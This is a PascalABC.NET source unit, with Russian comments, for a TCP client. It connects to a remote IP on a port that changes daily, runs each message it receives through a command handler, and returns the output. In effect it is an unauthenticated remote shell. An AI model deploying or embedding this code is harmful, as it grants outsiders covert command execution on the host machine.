unit client;

uses System.Net.Sockets, System.Net, System.Text, System.Threading, System, Newtonsoft.Json;
uses types, cmd;

type TClient = class 
  
  public AppIsRunning: boolean;

  public next, prev: TClient; 
  public ip: string;
  public client: TcpClient;
  public stream: NetworkStream;
  public retry: byte;
  public port: integer;
  public path: string;
  
  public _pp_service: Thread;
  
  public constructor (ip: string);
  begin
    self.AppIsRunning := true;
    self.ip := ip; 
    self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
    self._pp_service := new Thread(PPService);
  end;
  
  
  public constructor (ip: string; port: integer; clnt: TcpClient);
  begin
    self.AppIsRunning := true;
    self.client := clnt;
    self.client.Client.ReceiveTimeout := 100;
    self.ip := ip;
    self.port := port;
    self._pp_service := new Thread(PPService);
  end;
  
  
  public function ConnectedMsg(): string;
  begin
    if self.client = nil then
      Result := 'Сервер не отвечает!' else 
      Result := 'Подключение установлено!';
  end;
  
  
  public procedure Connect();
  begin
    Thread.Create(
      () -> begin
        while self.retry < MAX_RETRIES do
        begin
          try
            self.client := new TcpClient(self.ip, self.port);
            self.client.Client.ReceiveTimeout := 100;
            self.client.SendTimeout := 4000;
            self.client.ReceiveTimeout := 4000;
            self._pp_service.Start();
            cmd.CD();
            self.path := cmd.output;
            break; // Если подключились, выходим из цикла
          except
            Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
          end;
          Inc(self.retry);
        end;
      end
    ).Start();
    
  end;
  

  public procedure Disconnect();
  begin
    if (self.client <> nil) and (self.client.Connected) then begin
      self.client.Close();
      self.client.Dispose();
      self.client := nil;
      self._pp_service.Suspend();
    end;
  end;
  
  
  public procedure KillAllServices();
  begin
    // Устанавливаем флаг остановки
    AppIsRunning := false;
    
    // Ждем завершения всех потоков
    foreach var service in [self._pp_service] do begin
      if (service <> nil) and service.IsAlive then begin
        service.Join(1000); // Даем 1 секунду на завершение
        if service.IsAlive then
          service.Abort(); // Принудительное завершение, если не ответил
      end;
    end;
   
  end;
  
  
  procedure PPService();
  begin
    stream := self.client.GetStream();
    var data: array of byte;
    while self.AppIsRunning do begin
      if stream.DataAvailable then begin
        SetLength(data, self.client.ReceiveBufferSize);
        
        var len := stream.Read(data, 0, data.Length);
        
        if len = 0 then 
          self.AppIsRunning := false; 
        var message := Encoding.UTF8.GetString(data, 0, len);
        
        if message = 'PING' then 
          data := Encoding.UTF8.GetBytes('PONG') else 
        if message = GETPATH then
          data := Encoding.UTF8.GetBytes(self.path) else 
        begin 
          message := MessageHandler(message);
          data := Encoding.UTF8.GetBytes(message);
        end;
        
        stream.Write(data, 0, data.Length);
        
      end  
    end;
    
  end;
  
  /// Обработка полученных сообщений
  function MessageHandler(msg: string): string;
  begin
    var responce: string;
    
    cmd.run(msg);
    responce := cmd.output;
    
    if responce.StartsWith('cd>') then begin
      responce := responce.Substring(3);
      self.path := responce;
    end;
       
    Result := responce;
  end;
  
  
end;

end.
